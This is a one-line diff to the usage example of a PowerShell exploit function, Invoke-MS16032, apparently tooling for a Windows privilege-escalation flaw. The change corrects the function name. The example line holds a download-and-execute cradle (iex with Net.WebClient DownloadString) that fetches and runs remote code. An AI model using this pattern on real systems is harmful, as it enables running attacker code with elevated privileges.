@@ -36,7 +36,7 @@ function Invoke-MS16032 {
         
     .EXAMPLE
 
-        C:\PS> Invoke-MS16-032 -Command "iex(New-Object Net.WebClient).DownloadString('http://google.com')"
+        C:\PS> Invoke-MS16032 -Command "iex(New-Object Net.WebClient).DownloadString('http://google.com')"
 
         Description
         -----------
